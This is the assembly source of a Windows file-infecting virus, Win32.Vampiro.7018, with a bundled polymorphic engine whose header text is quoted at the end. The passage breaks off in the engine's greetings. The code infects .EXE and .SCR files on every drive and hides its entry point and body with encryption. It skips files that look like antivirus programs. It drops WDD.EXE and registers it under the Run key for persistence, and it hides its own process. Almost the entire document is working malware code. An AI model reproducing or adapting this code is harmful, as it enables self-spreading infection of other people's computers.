
; Win32.Vampiro.7018
;
;  + UEP
;  + POLY
;  + RESIDENT 
;  + SFC Check
;  + MAZER FUCKER ALL INFECT
;
;  Small period of writing. Only 2 weeks.
;
; Use :
;      - [ETMS] v0.36 by b0z0/iKX                 [bug fixed]
;      - Length-Disassembler Engine by Z0mbie
;      - aPLib v0.22b by Joergen Ibsen / Jibz        
;      - Source of Win32.Vampiro by LordDark
;      - Win32.Libertine by <NeverLoved> [SSR]
;      - SFC library by GriYo
;
;   and thx 2 other peoplz
;
;  <x> Ivan
;

%OUT Hey man, you can't comiple it!!!
%OUT You have already compiled...
.err

.586

zcall   macro api
        extrn api: proc
        call  api
        endm

CRC32_init	equ 0EDB88320h
CRC32_num       equ 0FFFFFFFFh   

CRC32_eax macro string
          db 0B8h
          CRC32 string  
          endm 

CRC32	macro	string
	    crcReg = CRC32_num
	    irpc    _x,<string>
		ctrlByte = '&_x&' xor (crcReg and 0FFh)
		crcReg = crcReg shr 8
		rept 8
		    ctrlByte = (ctrlByte shr 1) xor (CRC32_init * (ctrlByte and 1))
		endm
		crcReg = crcReg xor ctrlByte
	    endm
	    dd	crcReg
endm

import_beg macro kernel
           db '&kernel&',0
           endm

import_nam macro name
           CRC32 &name&
           local b
           b=0
           irpc a,<name>
               IF b EQ 0 
                  db '&a&'
               ENDIF
               b=b+1
           endm
&name&     dd    0       
           endm 

import_end macro 
           dd 0
           endm

MAX_PATH = 260

find_str struc
         dwFileAttributes  dd ?
         ftCreationTime    dq ?
         ftLastAccessTime  dq ?
         ftLastWriteTime   dq ? 
         nFileSizeHigh     dd ? 
         nFileSizeLow      dd ?
         dwReserved0       dd ?
         dwReserved1       dd ?   
         cFileName         db MAX_PATH dup (?)
         cAlternateFileName db 14 dup (?)
         ends

locals     __
.model flat
.code
    db   ?
.data
    include x.inc
start proc
    call get_delta
    call set_seh
    mov  esp, [esp.8]
    jmp  exit
set_seh:
    sub  eax, eax
    push 4 ptr fs:[eax]
    mov  4 ptr fs:[eax], esp
    lea  eax, [ebp.start]
    mov  4 ptr [ebp.vl_of], eax
    call GetKernel32
    mov  4 ptr [ebp.k32], eax 
    call import
    push 0
    call [ebp.GetModuleHandleA]
    add  eax, 4 ptr [ebp.host32_2]
    mov  4 ptr [ebp.host32_2], eax
    lea  edx, [ebp.reloc_jmp]
    sub  eax, edx
    mov  4 ptr [ebp.reloc_jmp+1-5], eax
    push 0 5
    lea  eax, [ebp.saved]
    push eax
    mov  eax, 4 ptr [ebp.host32_2]
    push eax
    call [ebp.GetCurrentProcess]  
    push eax 
    call [ebp.WriteProcessMemory] 
    push _vl 0
    call [ebp.GlobalAlloc]
    push eax
    xchg eax, edi
    lea esi, [ebp.start]
    mov ecx, offset packed - start
    lea eax, [ebp+__exit]
    push eax
    lea eax, [edi+__next-start]
    push eax
    rep movsb
    lea  eax, [ebp.packed]
    push edi
    push eax
    call _aP_depack_asm
    ret
__next:
    call get_delta
    push eax eax esp
    call [ebp.GetSystemTimeAsFileTime]
    pop  eax
    pop  edx
    add  eax, edx  
    mov [ebp.seed], eax
    cmp  1 ptr [ebp.is_drop], 1
    mov  1 ptr [ebp.is_drop], 0    
    jz    __k
    lea eax, [ebp.Vampiro]
    push eax
    call [ebp.GlobalFindAtomA]
    movzx eax, ax
    test eax, eax
    jnz __x
    call create_dropper
__x:
    ret 
__k:
    lea eax, [ebp.Vampiro]
    push eax
    call [ebp.GlobalAddAtomA]
    call hide
    push 10000
    call [ebp.Sleep]
    call infect_all 
    lea eax, [ebp.Vampiro]
    push eax
    call [ebp.GlobalFindAtomA]
    movzx esi, ax
    push 20
    pop  ecx 
__delete:
    push esi
    call [ebp.GlobalDeleteAtom]
    test eax, eax
    loopne __delete
    ret
__exit:
    call [ebp.GlobalFree] 
exit: 
    pop 4 ptr fs:[0]
    pop eax
    popad
    popf
    db 0E9H
    dd 0
reloc_jmp:  
    endp 

_aP_depack_asm:
    push   ebp
    mov    ebp, esp
    pushad
    push   ebp

    mov    esi, [ebp + 8]     ; C calling convention
    mov    edi, [ebp + 12]

    cld
    mov    dl, 80h

literal:
    movsb
nexttag:
    call   getbit
    jnc    literal

    xor    ecx, ecx
    call   getbit
    jnc    codepair
    xor    eax, eax
    call   getbit
    jnc    shortmatch
    mov    al, 10h
getmorebits:
    call   getbit
    adc    al, al
    jnc    getmorebits
    jnz    domatch_with_inc
    stosb
    jmp    short nexttag
codepair:
    call   getgamma_no_ecx
    dec    ecx
    loop   normalcodepair
    mov    eax,ebp
    call   getgamma
    jmp    short domatch

shortmatch:
    lodsb
    shr    eax, 1
    jz     donedepacking
    adc    ecx, 2
    mov    ebp, eax
    jmp    short domatch

normalcodepair:
    xchg   eax, ecx
    dec    eax
    shl    eax, 8
    lodsb
    mov    ebp, eax
    call   getgamma
    cmp    eax, 32000
    jae    domatch_with_2inc
    cmp    eax, 1280
    jae    domatch_with_inc
    cmp    eax, 7fh
    ja     domatch

domatch_with_2inc:
    inc    ecx

domatch_with_inc:
    inc    ecx
domatch:
    push   esi
    mov    esi, edi
    sub    esi, eax
    rep    movsb
    pop    esi
    jmp    short nexttag

getbit:
    add     dl, dl
    jnz     stillbitsleft
    mov     dl, [esi]
    inc     esi
    adc     dl, dl
stillbitsleft:
    ret

getgamma:
    xor    ecx, ecx
getgamma_no_ecx:
    inc    ecx
getgammaloop:
    call   getbit
    adc    ecx, ecx
    call   getbit
    jc     getgammaloop
    ret

donedepacking:
    pop    ebp
    sub    edi, [ebp + 12]
    mov    [ebp - 4], edi     ; return unpacked length in eax

    popad
    pop    ebp
    ret    8


GetKernel32:
    call __set_seh
    sub  eax, eax
    mov  esp, [esp.8]
    dec  eax
    jmp  __exit 
__set_seh:
    sub  eax, eax
    push 4 ptr fs:[eax]
    mov  4 ptr fs:[eax], esp 
    mov  edx, 4 ptr fs:[0]; get first esp fault
__3:
    mov  eax, [edx+4]     ; offset fault
    mov  edx, [edx]       ; next fault ofz
    sub  ax, ax
__2:
    cmp  1 ptr [eax], 'M'
    jz   __1 
    sub  eax, 10000h
    jmp  __2
__1:     
    movzx esi, 2 ptr [eax+3Ch]
    add esi, eax
    cmp 1 ptr [esi], 'P'
    jnz __3
    mov esi, [esi+78h] ; no export
    test esi, esi
    jz  __3  
    mov esi, [esi+eax+0Ch]
    cmp 4 ptr [esi+eax], 'NREK'
    jnz __3
__exit:
    pop 4 ptr fs:[0]
    pop edx
    ret

import_table:
import_beg kernel32
import_nam _lopen
import_nam _lcreat
import_nam ReadFile
import_nam WriteFile
import_nam CloseHandle
import_nam CreateProcessA
import_nam SetFileAttributesA
import_nam GetFileAttributesA
import_nam GetFileTime
import_nam GetProcAddress
import_nam SetFileTime
import_nam SetEndOfFile
import_nam GetFileSize
import_nam GetCurrentProcessId
import_nam SetFilePointer
import_nam WriteProcessMemory
import_nam GetCurrentProcess
import_nam GlobalAlloc
import_nam GlobalFree
import_nam FindClose
import_nam FindFirstFileA
import_nam FindNextFileA
import_nam FreeLibrary
import_nam SetCurrentDirectoryA
import_nam GetDriveTypeA
import_nam GetTempPathA
import_nam GetSystemDirectoryA
import_nam SetErrorMode
import_nam Sleep
import_nam GlobalFindAtomA
import_nam GlobalAddAtomA
import_nam GlobalDeleteAtom
import_nam GetSystemTimeAsFileTime
import_nam GetCurrentDirectoryA
import_nam MultiByteToWideChar
import_end
import_beg advapi32.dll
import_nam RegSetValueExA
import_nam RegCreateKeyExA
import_nam RegCloseKey
import_end
import_end

get_delta proc
     call $+5
delta:
     cld 
     pop ebp
     sub ebp, offset delta
     ret
     endp

get_proc proc
    push ebp
    ; in: 
    ; eax - CRC32
    ; ebx - DLL offset
    ; dl  - first char
    ; out:
    ; eax       - API address
    ; [ecx+ebx] - offset API address in table
    ; ebx       - offset DLL
    movzx edi, 2 ptr [ebx+3Ch]
    mov edi, [edi+78h+ebx]
    mov ecx, [edi+18h+ebx]
    mov esi, [edi+20h+ebx]
__1:
    mov ebp, [esi+ebx]
    add ebp, ebx
    cmp 1 ptr [ebp], dl
    jnz __2
    push ebx ecx
    ; use ebx, ecx
    ; ebp - offset to name'z
    xor ebx, ebx
    dec ebx
__5:
    xor bl, 1 ptr [ebp]  
    inc ebp
    mov cl, 7
__3:
    shr ebx, 1
    jnc __4
    xor ebx, CRC32_init
__4: 
    dec cl
    jns __3
    cmp  1 ptr [ebp], 0
    jnz __5
    cmp eax, ebx
    pop ecx ebx
    jz __6
__2:
    add esi, 4   
    loop __1  
__6:
    sub ecx, [edi+18h+ebx]
    neg ecx
    add ecx, ecx
    add ecx, [edi+24h+ebx]
    add ecx, ebx
    movzx ecx, 2 ptr [ecx]
    shl ecx, 2
    add ecx, [edi+1Ch+ebx]
    mov eax, [ecx+ebx]
    add eax, ebx
    pop ebp 
    ret
    endp

import proc
    mov ebx, [ebp.k32]
    CRC32_eax GetModuleHandleA
    mov dl, 'G'
    call get_proc
    mov [ebp.GetModuleHandleA], eax
    CRC32_eax LoadLibraryA
    mov dl, 'L'
    call get_proc
    mov [ebp.LoadLibraryA], eax
    lea esi, [ebp.import_table]  
__1:
    push esi
    call [ebp.GetModuleHandleA]
    test eax, eax
    jnz  __2
    ; if library not load ...
    push esi
    call [ebp.LoadLibraryA]
__2: 
    xchg eax, ebx
__3:
    lodsb
    test al, al
    jnz __3 
__4:
    lodsd
    test eax, eax
    jz   __5
    mov dl, [esi]
    inc esi
    push esi
    call get_proc
    pop edi
    stosd
    mov esi, edi
    jmp __4
__5: 
    cmp [esi], eax
    jnz __1  
    ret  
    endp

GetModuleHandleA   dd 0
LoadLibraryA       dd 0   
k32                dd 0BFF70000h

extra_data:

is_drop   db           0

saved:
    ret  
    db 4 dup (90h)

host32_2:
    dd offset host32-00400000h

extra_len equ offset $-extra_data

vl_sz              dd 7016+2
vl_of              dd 0

                   org $-2
                   db '^^'    


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

packed:

exec:
     sub esp, 16
     mov ecx, esp
     sub esp, 64
     mov ebx, esp
     mov 1 ptr [ebx], 64
     push ecx ebx 0 0 0 0 0 0 0 eax
     call [ebp.CreateProcessA]
     add esp, 16+64
     ret


host32_1:
    dd 0



Vampiro   equ this byte
name_atom db 'Vampiro',0



sfc  proc 
;     call log_it  
     mov esi, edx
     push 'LLD' 
     push '.CFS'
     push esp
     call [ebp.LoadLibraryA]
     add esp, 8
     test eax, eax
     jz __1
     push eax
     sub esp, 100h+4
     push esp 100h+4
     call [ebp.GetCurrentDirectoryA]
     lea edi, [esp+eax]
     mov al, '\'
     cmp 1 ptr [edi-1], al
     jz __2
     stosb
__2: movsb 
     cmp 1 ptr [esi-1], 0
     jnz __2
     mov eax, esp
     sub esp, 200h+8
     mov edx, esp
     push 100h+4
     push edx
     push -1
     push eax
     push 0
     push 0
     call [ebp.MultiByteToWideChar]
     call __3
     db  'SfcIsFileProtected',0
__3: push 4 ptr [esp+4+200h+100h+4+8]
     call [ebp.GetProcAddress]
     test eax, eax
     jz  __4
     push esp 0 
     call eax
__4: xchg esi, eax
     add esp, 200h+100h+8+4
     call [ebp.FreeLibrary]
     xchg esi, eax
__1: ret 
     endp

key db 'Software\Microsoft\Windows\CurrentVersion\Run',0

create_dropper proc
    sub  esp, 100h
    mov  eax, esp
    push 100h
    push eax 
    call [ebp.GetSystemDirectoryA] ; D:\WINDOWS\SYSTEM32   
    mov  1 ptr [esp+eax],   '\'
    mov  4 ptr [esp+eax+1], '.DDW'
    mov  4 ptr [esp+eax+5], 'EXE'
    mov  edx, esp
    call drop_gen
    cmp  eax, -1
    jz  __3x
    mov  edx, esp
    mov  1 ptr [ebp.is_drop], 1
    call infect_it
    mov  eax, esp
    call exec 
    mov  esi, esp
    push eax 
    push eax 
    mov edi, esp
    lea edx, [edi.4]
    sub eax, eax
    push edx 
    push edi
    push eax
    push 0f003fh
    push eax
    push eax
    push eax
    lea eax, [ebp+key]
    push eax
    push 80000002h
    call [ebp+RegCreateKeyExA]
    test eax, eax
    jnz @@x
    sub ecx, ecx
    mov edx, esi
__x:
    mov al, [edx]
    inc edx
    inc ecx
    test al, al
    jnz __x
    dec ecx
    push ecx
    push esi
    push 1
    push 0
    lea eax, [ebp+name_atom]
    push eax 
    push 4 ptr [edi]
    call [ebp+RegSetValueExA]
    push 4 ptr [edi]
    call [ebp+RegCloseKey]
@@x:
    add esp, 8
    jmp __4
__3x:
    push esp
    push 100h
    call [ebp.GetTempPathA]         ; C:\WINDOWS\TEMP\
    mov  4 ptr [esp+eax],   '.DDW'
    mov  4 ptr [esp+eax+4], 'EXE'
    mov  edx, esp
    call drop_gen
    cmp  eax, -1
    jz   __4  
    mov  edx, esp
    mov  1 ptr [ebp.is_drop], 1    
    call infect_it
    mov  eax, esp
    call exec
__4:add  esp, 100h
    ret
    endp

infect_all proc
    push '\:A'
__2:push esp
    call [ebp.GetDriveTypeA]
    cmp  eax, 2
    jbe  __1 
    cmp  al, 5
    jz   __1
    push esp
    call [ebp.SetCurrentDirectoryA]
    mov  esi, esp
    sub  esp, ((size find_str) and (not 11b))+4
    mov  edi, esp
    call recsearch
    add  esp, ((size find_str) and (not 11b))+4
__1:inc  1 ptr [esp]
    cmp  1 ptr [esp], 'Z'+1
    jnz  __2
    pop  eax
    ret
    endp

recsearch:
    push '*.*'
    mov  eax, esp
    push edi eax
    call [ebp.FindFirstFileA]
    pop  edx
    cmp  eax, -1
    jz  __1 
    xchg eax, ebx
__2:mov eax, esi
    sub eax, esp
    cmp eax, 0C00h
    ja  __4
    test 1 ptr [edi.dwFileAttributes], 10h
    jz  __3    ; JZ - not DIR
    cmp  1 ptr [edi.cFileName],        '.'
    jz  __4 
    lea  eax, [edi.cFileName]
    push eax
    call [ebp.SetCurrentDirectoryA]
    push ebx
    call recsearch
    push '..'
    push esp
    call [ebp.SetCurrentDirectoryA]    
    pop eax
    pop ebx
    jmp __4
__3:pusha
    lea    edx, [edi.cFileName]
    mov    edi, edx
    push   -1
    pop    ecx
    sub    al, al
    repne  scasb
    mov    eax, [edi-4]
    and    eax, 0DFDFDFDFh
    cmp    eax, 'EXE' and 0DFDFDFDFh ; .EXE
    jz     __7
    cmp    eax, 'RCS' and 0DFDFDFDFh ; .SCR
    jnz    __6
__7:    
    call   infect_it
    push   2000
    call   [ebp.Sleep]
__6:
    popa
__4:
    push edi
    push ebx
    push 500
    call [ebp.Sleep]
    call [ebp.FindNextFileA]
    test eax, eax
    jnz __2
    push ebx
    call [ebp.FindClose]
__1:ret

hide proc

SEM_FAILCRITICALERRORS      =  00001h
SEM_NOGPFAULTERRORBOX       =  00002h
SEM_NOALIGNMENTFAULTEXCEPT  =  00004h
SEM_NOOPENFILEERRORBOX      =  08000h

   push SEM_FAILCRITICALERRORS or SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX
   call [ebp.SetErrorMode]
   call __1
   db 'RegisterServiceProcess',0
__1:
   push 4 ptr [ebp.k32] 
   call [ebp.GetProcAddress]
   test eax, eax
   jz   __2 
   xchg eax, ebx
   call [ebp.GetCurrentProcessId]
   push 1
   push eax
   call ebx
__2: 
   ret   
   endp

; не трогать:
;         - _A
;         - VI
;         - UN
;         - SC
;         - NO 
;         - AV


infect_it proc
     call __set_seh
     mov  esp, [esp.8]
     jmp  __1
__set_seh:
     cld 
     sub eax, eax
     push 4 ptr fs:[eax]
     mov  4 ptr fs:[eax], esp
     mov  ax, [edx]
     and  eax, 0DFDFh
     cmp  eax, 'A_' and 0DFDFh
     jz   __1
     cmp  eax, 'IV' and 0DFDFh
     jz   __1
     cmp  eax, 'NU' and 0DFDFh
     jz   __1
     cmp  eax, 'CS' and 0DFDFh
     jz   __1
     cmp  eax, 'ON' and 0DFDFh
     jz   __1
     cmp  eax, 'VA' and 0DFDFh
     jz   __1
     push edx
     call sfc  ; EAX == 0 -> OK
     pop  edx
     test eax, eax
     jnz  __1
     call infect
__1:
     pop 4 ptr fs:[0]
     pop eax 
     ret
     endp

infect proc
       ; edx - name
       call fattrg
       cmp  eax, -1
       jnz __1
__2:
       ret
__1:   sub  ecx, ecx
       xchg eax, ecx
       call fattrs
       test eax, eax
       jz  __2
       push 2
       pop eax
       call open
       cmp eax, -1
       xchg eax, ebx
       jz __2
       push ecx 
       sub  esp, 3*8
       mov  esi, esp
       push edx
       call gettime
       lea  edx, [ebp.buffer]
       push 3Ch+4
       pop  ecx
       call read
       jc   __close
       cmp  2 ptr [edx], 'ZM'
       jnz __close
       cmp  2 ptr [edx.18h], 40h
       jb  __close
       push edx
       movzx edx, 2 ptr [edx.3Ch]
       mov  [ebp.word3C], edx
       call seek
       pop edx
       mov ecx, 0F8h + (28h*8)   
       call read
       jc __close
       cmp 2 ptr [edx], 'EP'
       jnz __close
       ; dll ? if i process dll then skip
       ; this test
       test 2 ptr [edx.16h], 2000h
       jnz __close
       ; can run ?
       test 2 ptr [edx.16h], 0002h
       jz  __close
       ; good image base ?
       cmp  4 ptr [edx.160], 0    
       jz   __yeeah
       cmp  4 ptr [edx.52], 00400000h
       jnz  __close
__yeeah:       
       ; intel x86 processor ?
       mov al, [edx.4]
       and al, 11110000b
       cmp al, 40h
       jnz __close
       ; 2..8 sections ?
       cmp  2 ptr [edx.06h], 8
       ja  __close
       cmp  2 ptr [edx.06h], 2
       jb  __close
       ; it's already ?
       test  1 ptr [edx.44h],  16
       jnz   __close
       or    1 ptr [edx.44h],  16
       ; save EIP
       mov  eax, [edx.28h]
       mov  4 ptr [ebp.host32_1], eax
       mov  eax, [edx+52]
       mov  [ebp.save_me], eax
       mov  eax, 1000h
       cmp  [edx.38h], eax
       ja   __close
       cmp  [edx.3Ch], eax
       ja   __close  
       lea  edi, [ebp.buff]
       mov  ecx, (len_buff)/4
       sub  eax, eax
       rep  stosd
       mov  4 ptr [edx.58h], eax
       call process_it
__close:
       pop  edx
       mov  esi, esp
       call settime
       add  esp, 3*8
       call close
       pop  eax 
       call fattrs 
       ret
       endp

process_it proc
       movzx eax, 2 ptr [edx.14h]
       cmp  al, 0E0h
       jnz  __1
       lea  edi, [eax+18h+edx] 
       movzx ecx, 2 ptr [edx.6]
__loop:
       ; check file
       mov  esi, [edx.28h]
       cmp  4 ptr [edi.0Ch], esi
       ja   __4
       push eax
       mov  eax, 4 ptr [edi.0Ch]
       add  eax, 4 ptr [edi.10h]
       cmp  esi, eax
       pop  eax
       jb   __5
__4:   add  edi, 28h 
       loop __loop
       jmp  __1
__5:   test 1 ptr [edi.27h], 80h
       jnz  __1  
       mov  esi, [edi.12]
       add  esi, [edi.16]
       sub  esi, [edx.40]
       mov  4 ptr [ebp.__rule_me], size_UEP-4
       cmp  esi, size_UEP-4
       ja   __b
       sub  esi, 4
       mov  4 ptr [ebp.__rule_me], esi
__b:   ; read from IP some bytes
       ; for UEP
       lea  esi, [eax+18h+edx] 
       push edx
       mov eax, [edx.028h]
       sub eax, [edi.0Ch]
       add eax, [edi.14h]
       mov  4 ptr [ebp.forUEP], eax
       xchg eax, edx
       call seek
       lea  edx, [ebp.UEP]
       mov  ecx, 4 ptr [ebp.__rule_me]
       add  ecx, 4 
       call read
       pop edx
       jc   __1
       movzx eax, 2 ptr [edx.6]
       dec eax
       imul eax, eax, 28h
       add esi, eax
       mov edi, [esi.14h]
       add edi, [esi.10h]
       call fsize
       cmp eax, edi
       jz  __2
       push edx
       mov  edx, edi
       call seek
       push eax eax 
       mov  edx, esp
       push 8
       pop  ecx
       call read 
       pop  eax
       pop  ecx
       cmp  eax, 1
       jnz   __not_3
       cmp  ecx,  1234567h
       org  $-4  
       db   10h,1,0,0
       jz   __3 
__not_3:
       and  eax, 1234567h
       org  $-4
       db   0FFh, 0FFh, 0F0h, 0 
       cmp  eax, 1234567h   
       org  $-4
       db   'N','B',30h,0 
       jz   __3
       call fsize
       sub eax, edi
       cmp eax, 100h ; 256 bytes only
                     ; if yes then skip it ;)
       jb   __3
       pop eax
       jmp __1
__3:   mov  edx, edi
       call seek 
       call truncate 
       pop  edx
__2:   mov  [ebp.flen], edi
       mov  eax,  [edx.160]
       test eax, eax
       jz   __ok   
       mov  edi, [esi.12]
       cmp  eax, edi
       jb   __1
       add  edi, [esi.16]
       cmp  eax, edi
       ja   __1
       dec  2 ptr [edx.6]
       push edx
       push 28h
       pop ecx
       sub eax, eax
       mov 4 ptr [edx.160], eax
       mov 4 ptr [edx.164], eax
       mov  edx, [esi.20]
       mov edi, esi
       rep stosb
       call seek 
       mov  [ebp.flen], eax
       call truncate 
       mov edx, [ebp.word3C]
       call seek
       lea edx, [ebp.buffer]
       mov ecx, 0F8h + (28h*8)   
       call write 
       pop edx
       sub esi, 28h  
__ok:  cmp  4 ptr [esi.1], 'zniw' ; winz
       jz   __1
       or  1 ptr [esi.24h+3], 0C0h        
       pusha
       lea  eax, [ebp.tbl]
       push eax
       call disasm_init
       add  esp, 4
       push 1234567h
__rule_me   equ 2 ptr $-4
       pop  ecx
       lea  edi, [ebp.UEP]
       sub  ebx, ebx
__find:
       inc  ebx
       cmp  ebx, (size_UEP-4) / 2
       ja   __error 
       push edi
       lea  eax, [ebp.tbl]
       push eax 
       call disasm_main
       add  esp, 8
       cmp  eax, -1
       jnz   __no_error
__error:
       lea  edi, [ebp.UEP]
       jmp  __found
__no_error:
       sub  ecx, eax
       jc   __error
       lea   edx, [ebp.UEP]
       cmp  1 ptr [edi], 0EBh
       jnz  __no_EB
       movsx eax, 1 ptr [edi.1]
       push  edi
       inc   edi
       inc   edi
       add   edi, eax
       pop   eax
       cmp   edi, edx
       jb     __error
       add   edx, 4 ptr [ebp.__rule_me]
       cmp   edi, edx
       ja    __error
       push  edi
       xchg  eax, edi
       sub   eax, edi
       sub   ecx, eax
       pop   edi
       jmp   __find
__no_EB:
       cmp  1 ptr [edi], 0E9H
       jz   __found
       mov  edx, 4 ptr [ebp.__rule_me]
       sub  edx, 128
       cmp  ecx, edx
       ja   __no_E8
       cmp  1 ptr [edi], 0E8h
       jz   __found        
__no_E8: 
       add  edi, eax
       jmp  __find  
__found:
       lea  ecx, [ebp.UEP]        
       mov  eax, edi
       sub  eax, ecx
       add  eax, 4 ptr [ebp.host32_1]
       mov  4 ptr [ebp.host32_2], eax 
       mov eax, [edi]
       mov 4 ptr [ebp.saved], eax
       mov al, [edi.4]
       mov 1 ptr [ebp.saved+4], al
       mov al, 0E9h
       stosb
       lea  edx, [ebp.UEP]
       mov  eax, edi
       dec  eax
       sub  eax, edx
       neg  eax
       add  eax, 4 ptr [esi.10h]
       add  eax, 4 ptr [esi.0Ch]
       sub  eax, 4 ptr [ebp.host32_1]
       sub  eax, 5
       stosd
       ;;;;;; FUCK
       lea esi, [ebp.extra_data]
       push extra_len
       pop ecx
       mov edi, [ebp.vl_of]
       add edi, offset extra_data - start  
       rep movsb 
       ;;;;;;
       popa
       pusha
       mov  esi, [ebp.vl_of]
       lea  edi, [ebp.buff+2]
       mov  ecx, [ebp.vl_sz]
;       rep  movsb 
       call engine_serv
;       mov  ecx, [ebp.vl_sz]
;       lea  edi, [ebp.buff+2]
       mov  _EAX, ecx
       mov  _EDI, edi 
       popa
       dec edi
       dec edi
       mov 2 ptr [edi], 609Ch
       inc eax
       inc eax 
       xchg eax, edi
       push eax 
       ; edi - virus length
       mov eax, edi
       add eax, [edx.3Ch]
       add eax, [esi.10h]
       mov ecx, [edx.3Ch]
       neg ecx
       and eax, ecx
       mov [esi.10h], eax
       cmp [esi.08h], eax
       ja  __x
       mov [esi.08h], eax
__x:   mov eax, [esi.08h]
       add eax, [esi.0Ch]
       push eax
       mov ecx, [edx.38h]
       neg ecx
       and eax, ecx 
       cmp eax, 4 ptr [esp]
       jae __xxx
       add eax, [edx.38h]
__xxx:
       mov [edx.50h], eax  
       pop eax
       call fsize
       xchg eax, edx
       call seek       
       pop edx 
       db  0BFh
flen   dd  0
       mov ecx, [esi.10h]
       add ecx, [esi.14h]
       sub ecx, edi
       call write
       mov edx, [ebp.forUEP]
       call seek
       lea edx, [ebp.UEP]
       mov  ecx, 4 ptr [ebp.__rule_me]
       add  ecx, 4
       call write
       mov edx, [ebp.word3C]
       call seek
       lea edx, [ebp.buffer]
       mov ecx, 0F8h + (28h*8)   
       call write 
__1:       
       ret
       endp

truncate proc
      pushad
      push ebx
      call [ebp.SetEndOfFile]
      jmp n_chk
      endp


fsize proc
      pushad
      push 0 ebx
      call [ebp.GetFileSize] 
      jmp n_chk       
      endp


gettime proc
      pushad
      ; esi - addres struc
      ;
      ;  CONST FILETIME *  lpftLastWrite 	// time the file was last written 
      ;  CONST FILETIME *  lpftLastAccess,	// time the file was last accessed 
      ;  CONST FILETIME *  lpftCreation,	// time the file was created 
      ;
      ; filetime struc
      ;      dwLowDateTime   dd ?
      ;      dwHighDateTime  dd ? 
      ;      ends
      push esi
      lodsd
      lodsd
      push esi
      lodsd
      lodsd
      push esi ebx
      call [ebp.GetFileTime]
      jmp n_chk       
      endp


settime proc
      pushad
      ; esi - addres struc
      ;
      ;  CONST FILETIME *  lpftLastWrite 	// time the file was last written 
      ;  CONST FILETIME *  lpftLastAccess,	// time the file was last accessed 
      ;  CONST FILETIME *  lpftCreation,	// time the file was created 
      ;
      ; filetime struc
      ;      dwLowDateTime   dd ?
      ;      dwHighDateTime  dd ? 
      ;      ends
      push esi
      lodsd
      lodsd
      push esi
      lodsd
      lodsd
      push esi ebx
      call [ebp.SetFileTime]
      jmp n_chk       
      endp

fattrs proc
      pushad
      push eax edx
      call [ebp.SetFileAttributesA]
      jmp n_chk
      endp

fattrg proc
      pushad
      push edx
      call [ebp.GetFileAttributesA]
      jmp n_chk
      endp

open proc
     pushad
     ; eax - mode
     ; edx - name
     ;
     ; OF_READ		Opens the file for reading only.
     ; OF_READWRITE	Opens the file for reading and writing.
     ; OF_WRITE		Opens the file for writing only.
     push eax edx
     call [ebp._lopen] 
n_chk:
     mov [esp.1Ch], eax
     popad
     ret
     endp

close proc
     pushad
     push ebx
     call [ebp.CloseHandle]
     popad
     ret 
     endp

write proc
     pushad
     push eax
     mov  eax, esp
     push 0
     push eax 
     push ecx edx ebx  
     call [ebp.WriteFile]
     jmp n_check
     endp

read proc
     ; ecx - length
     ; ebx - handle
     ; edx - buffer
     pushad
     push eax
     mov  eax, esp 
     push 0
     push eax
     push ecx edx ebx  
     call [ebp.ReadFile]
n_check:
     pop eax
     mov [esp.1Ch], eax
     popad
     cmp eax, ecx
     jz  __1
     stc
__1:
     ret  
     endp

seek proc
     pushad
     push 0 0 edx ebx
     call [ebp.SetFilePointer]
     jmp n_chk 
     endp


      _EAX   EQU  4 PTR [ESP+7*4]
      _ECX   EQU  4 PTR [ESP+6*4]
      _EDX   EQU  4 PTR [ESP+5*4]
      _EBX   EQU  4 PTR [ESP+4*4]
      _ESP   EQU  4 PTR [ESP+3*4]
      _EBP   EQU  4 PTR [ESP+2*4]
      _ESI   EQU  4 PTR [ESP+1*4]
      _EDI   EQU  4 PTR [ESP+0*4]


save_me dd 0

engine_serv:
      push edx ecx
      mov eax, [ebp.seed]
      mov ecx, 714024+1
      sub edx, edx 
      div ecx 
      mov [ebp.seed], edx
      pop ecx edx 
      mov eax, _EBP
      pusha
      mov  eax, 25*1024
      add  eax, [ebp.vl_sz]
      push eax 0
      call [ebp.GlobalAlloc]
      mov _EDX, eax
      popa   
      push edx ebp
      mov ebp, [ebp.save_me]
      add ebp, 4 ptr [eax.10h]
      add ebp, 4 ptr [eax.0Ch]
      inc ebp
      inc ebp
      call engine
      pop  ebp 
      pusha 
      push 4 ptr [esp+8*4]
      call [ebp.GlobalFree]
      popa 
      pop edx 
      ret 

engine:


;
;                      - expressway to my skull -
;                           - [ETMS] v0.36 -
;                             - b0z0/iKX -
;
; This is a polymorphic engine for Win32/Win9X viruses. It should be fully
; compatible with any 486+ processor. You should check ver. 0.1 (Xine#4)
; for some more basic informations.
;
; Changes from v0.1:
;       - Multiple layers of encryption (random from 2 to 7 layers)
;       - New garbage types added (MOVSX, MOVZX, BT family, SET family,
;         XADD, SHLD/SHRD, CMPXCHG, BSWAP, XLAT, ENTER/LEAVE) on regs,
;         mem, flags (when possible). Direct read/write on stack using
;         ESP + offset.
;       - Antiemulation structures (code emulation checks, stack consistency
;         checks, stack segment play, memory consistency on writes)
;       - New ways of incrementing/decrementing pointer/counter, changing
;         encryption key, initializing registers and exiting from loop.
;       - Some minor parts have been rewritten
;
; Using the poly:
;   Just add the ETMS source in your virus, simply:
;     include         etms.asm
;   Set the registers as described below and then call the poly. The poly uses
;  some data for internal purposes. This data of course is not needed to be
;  carried around with your infected file or whatever. You can just include
;  the ETMS source at the end of the file and then skip the bytes that start
;  from the label _mem_data_start. Of course you'll need to have that free
;  memory placed there at runtime.
;   The random seed (the dd at seed) should be initialized at first poly
;  run to a value between 0 and 714024.
;
;    Calling parameters:
;       ECX     =       Lenght of things to be encrypted
;       ESI     =       Pointer to what we want to encrypt
;       EDI     =       Where to place decryptor and encrypted stuff
;       EBP     =       Offset at which decryptor will run
;       EDX     =       Some free temporary place for the poly
;   The two needed space zones (EDI and EDX) should be at least 25kb plus
;  the lenght of your code. Just allocate some mem, you're in Windoze baby!
;
;    On exit:
;       EDI     =       Pointer to generated code
;       ECX     =       Lenght of generated code (decryptor + encrypted code)
;
; Contacts:
;   Email me at cl0wn@geocities.com or query me on irc.
;
; Special greetings:
;   I'd like to specially thank StarZero/iKX for the great support and for
;  convincing me to write this. Greetings also to pigpen/s0ftpj for persistent
;  support irl, crazyness roxor! ;), and also greets to claire for making me 
;  feel like i tought i could never feel
;
; Misc greetings to:
;   The entire iKX and S0ftpj crew and: kernel panic, darkman, gigabyte,
